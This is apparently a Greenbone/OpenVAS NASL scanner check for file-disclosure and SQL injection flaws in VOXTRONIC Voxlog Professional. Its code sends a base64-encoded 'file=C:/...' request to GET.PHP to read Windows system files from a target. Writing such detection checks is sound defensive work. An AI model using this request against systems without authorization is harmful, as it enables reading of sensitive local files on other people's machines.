# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103430");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("VOXTRONIC Voxlog Professional Multiple Security Vulnerabilities");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-02-20 14:56:07 +0100 (Mon, 20 Feb 2012)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("find_service.nasl", "httpver.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_mandatory_keys("Host/runs_windows");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52081");
  script_xref(name:"URL", value:"http://www.voxtronic.com/");

  script_tag(name:"summary", value:"VOXTRONIC Voxlog Professional is prone to a file disclosure
  vulnerability and multiple SQL injection (SQLi) vulnerabilities because it fails to properly
  sanitize user-supplied input.");

  script_tag(name:"impact", value:"An remote attacker can exploit these issues to obtain potentially
  sensitive information from local files on computers running the vulnerable application, or modify
  the logic of SQL queries. A successful exploit may allow the attacker to compromise the software,
  retrieve information, or modify data. This may aid in further attacks.");

  script_tag(name:"affected", value:"VOXTRONIC Voxlog Professional 3.7.2.729 and 3.7.0.633 are vulnerable.
  Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) )
  exit( 0 );

files = traversal_files( "Windows" );

foreach dir( make_list( "/voxlog", "/voxalert" ) ) {

  url = dir + "/oben.php";

  if( http_vuln_check( port:port, url:url, pattern:"<title>(voxLog|voxAlert)", usecache:TRUE ) ) {

    foreach pattern( keys( files ) ) {

      file = files[pattern];
      file = "file=C:/" + file;
      file = base64( str:file );

      url = dir + "/GET.PHP?v=" + file;

      if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
        report = http_report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 0 );
